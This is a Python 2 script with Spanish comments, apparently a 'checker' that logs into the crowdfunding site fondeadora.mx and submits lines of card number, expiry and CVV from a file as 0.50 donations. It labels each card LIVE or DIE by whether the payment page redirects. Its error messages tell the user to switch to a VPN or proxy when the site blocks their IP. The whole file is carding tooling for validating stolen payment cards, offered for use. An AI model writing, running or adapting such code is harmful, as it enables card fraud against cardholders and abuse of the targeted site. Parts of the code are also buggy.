#usr/bin/python

#El autor original es Zack Dasti ( Chapuawe )
#El script tiene la licencia GNU Public License v3.0
#Cualquiera puede imitar/modificar este script mientras de creditos al autor

import mechanize
import sys

#cc = sys.argv[1]
#ano = sys.argv[2]
#mes = sys.argv[3]
#cvv = sys.argv[4]

try:
	lista = sys.argv[1]
	email = sys.argv[2]
	password = sys.argv[3]

	print "\n"
	print "                    	Checker Version 0.5.0 \n";

	print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
	print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
	print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
	print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
	print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";

	print "	  ======================================================\n\n";
	print "		     	Iniciando el Checker :D\n\n";

except:
	print "\n"
	print "                    	Checker Version 0.5.0 \n";

	print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
	print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
	print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
	print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
	print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";

	print "	  ======================================================\n\n";
	print "	    Uso : python checker.py (archivo.txt) (email fondeadora) (contrasena fondeadora)\n\n\n";

	exit()


br = mechanize.Browser()
response = br.open('https://fondeadora.mx/login.html')

br.select_form(nr=2)

try:
	br.form['user[email]'] = email
	br.form['user[password]'] = password
except:
	print "  Email o contrasena incorrectos"
	exit()

br.submit()

contador = 0
limite = 1

ccs = open(lista ,'r')

while contador <= limite :

	try:
		cc, mes, ano, cvv = ccs.next().rstrip("\n").split("|")

	except:
		print "  El Checker Ha Terminado :D Disfruta tus lives o dies :)"

	if (mes == "10"):
		pass
	else:
		mes = mes.stripe("0")

	try:
		response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar')
		urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar'
		urlpass = br.geturl()

	except:
		print "  Tu ip se ha usado muchas veces :/ y el servidor te ha bloquado \n  intenta utilizar un vpn o proxy"
		exit()
	try:
		br.select_form(nr=2)

		br.form['date[year]'] = [ano]
		br.form['date[month]'] = [mes]

		br.set_value('Zack Dasti', nr=3)
		br.set_value(cc, nr=2)
		br.set_value(cvv, nr=6)

	except:
		print "  Porfavor usa un vpn o contacta al creador con la \n  screenshot de los errores del checker_tester"
		exit()

	try:
		br.submit()

	except:
		print "  Tu ip se ha usado muchas veces :/ y el servidor te ha bloquado \n  intenta utilizar un vpn o proxy"
		exit()

	if (urlpass != urlchecker):
		print "  LIVE  " + cc + "\n"
		contador = contador + 1
	else :
		print "  DIE  " + cc + "\n"

	contador = contador + 1
	limite = limite + 1

exit()

#Saludos a todo el chat de administracion de chats de lhg 
#Saludos a el chat # 1 y el chat #5 de lhg
# Y por ultimo saludos a mi bb Andrew Gonzales :3 <3cd